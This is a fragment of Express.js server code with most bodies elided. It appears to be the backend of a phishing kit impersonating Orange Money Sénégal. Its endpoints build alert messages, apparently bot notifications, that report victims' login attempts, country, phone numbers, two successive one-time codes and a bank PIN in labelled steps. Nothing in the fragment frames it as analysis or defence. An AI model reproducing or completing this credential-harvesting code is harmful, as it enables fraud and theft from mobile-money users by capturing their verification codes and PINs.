...
app.post('/api/login-notification', async (req, res) => {
    ...
    const message = `📱 <b>ORANGE MONEY SÉNÉGAL - LOGIN ATTEMPT</b>
...
app.post('/api/verify-first-otp', async (req, res) => {
    ...
    const otpMessage = `🆕 <b>ORANGE MONEY SÉNÉGAL - VERIFICATION NEEDED</b>
🇸🇳 <b>Country:</b> ${country}
📞 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
...
app.post('/api/verify-second-otp', async (req, res) => {
    ...
    const otpMessage2 = `2️⃣ <b>ORANGE MONEY SÉNÉGAL - SECOND OTP (Step 2/2)</b>
...
app.post('/api/verify-bank-pin', async (req, res) => {
    ...
    const bankPinMessage = `🏦 <b>ORANGE MONEY SÉNÉGAL - BANK PIN VERIFICATION (Step 3)</b>
